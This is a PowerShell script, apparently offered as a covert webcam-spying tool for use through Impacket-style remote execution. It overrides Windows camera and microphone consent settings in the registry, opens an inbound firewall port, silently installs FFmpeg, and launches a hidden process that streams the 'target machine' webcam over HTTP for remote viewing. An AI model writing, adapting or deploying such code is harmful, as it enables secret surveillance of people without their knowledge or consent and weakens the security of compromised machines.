<#
Stream Video Remoto - Versao Estavel
Repositorio: https://github.com/l0ckz3r0/StreamAudioWin
Compativel com Impacket / Execucao Remota
#>

# === CONFIGURACOES ===
$port = 8081  # Porta separada para nao conflitar com o de audio
$ffmpegPath = "C:\ffmpeg\bin\ffmpeg.exe"
$ffmpegUrl = "https://github.com/BtbN/FFmpeg-Builds/releases/download/latest/ffmpeg-master-latest-win64-gpl.zip"

# === PERMISSOES E FIREWALL ===
function Set-Permissions {
    $paths = @(
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone"
    )
    foreach ($p in $paths) {
        if (-not (Test-Path $p)) { New-Item -Path $p -Force | Out-Null }
        Set-ItemProperty -Path $p -Name Value -Value Allow -Type String -Force
    }
    Remove-NetFirewallRule -Name "StreamVideo" -ErrorAction SilentlyContinue | Out-Null
    New-NetFirewallRule -Name "StreamVideo" -DisplayName "Stream Video" -Direction Inbound -Protocol TCP -LocalPort $port -Action Allow -Enabled True | Out-Null
}

# === INSTALACAO AUTOMATICA DO FFMPEG ===
function Install-Ffmpeg {
    if (Test-Path $ffmpegPath) { return }
    $tmpZip = "$env:TEMP\ffmpeg.zip"
    $tmpDir = "$env:TEMP\ffmpeg_inst"
    Invoke-WebRequest -Uri $ffmpegUrl -OutFile $tmpZip -UseBasicParsing
    Expand-Archive -Path $tmpZip -DestinationPath $tmpDir -Force
    $folder = Get-ChildItem -Path $tmpDir -Directory -Filter "ffmpeg-*" | Select-Object -First 1
    New-Item -ItemType Directory -Path "C:\ffmpeg\bin" -Force | Out-Null
    Copy-Item -Path "$($folder.FullName)\bin\*" -Destination "C:\ffmpeg\bin\" -Recurse -Force
    $env:PATH += ";C:\ffmpeg\bin"
    [Environment]::SetEnvironmentVariable("PATH", $env:PATH, "Machine")
    Remove-Item $tmpZip, $tmpDir -Recurse -Force -ErrorAction SilentlyContinue
}

# === OBTER IP DA MAQUINA ALVO ===
function Get-MyIP {
    $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
        $_.InterfaceAlias -notmatch "Loopback|VMware|Virtual" -and $_.IPAddress -notlike "169.254.*"
    } | Select-Object -First 1).IPAddress
    if (-not $ip) { $ip = "10.0.0.92" }
    return $ip
}

# === INICIAR TRANSMISSAO ===
Clear-Host
Write-Host "==========================================="
Write-Host "    STREAM VIDEO REMOTO ATIVO"
Write-Host "==========================================="

Set-Permissions
Install-Ffmpeg
$myIP = Get-MyIP

Write-Host "`nAcesso via VLC: http://$myIP`:$port/stream"
Write-Host "==========================================="

# Comando otimizado: formato leve, taxa estavel e compativel com qualquer camera padrao
$cmd = "`"$ffmpegPath`" -y -f dshow -rtbufsize 16M -i video=`"Integrated Camera`" -vcodec mjpeg -q:v 5 -r 15 -s 1280x720 -f mpjpeg -listen 1 -reconnect 1 -reconnect_at_eof 1 -nostdin `"http://0.0.0.0:$port/stream`""

# Executa em segundo plano sem travar a conexao
Start-Process -FilePath cmd.exe -ArgumentList "/c $cmd" -WindowStyle Hidden
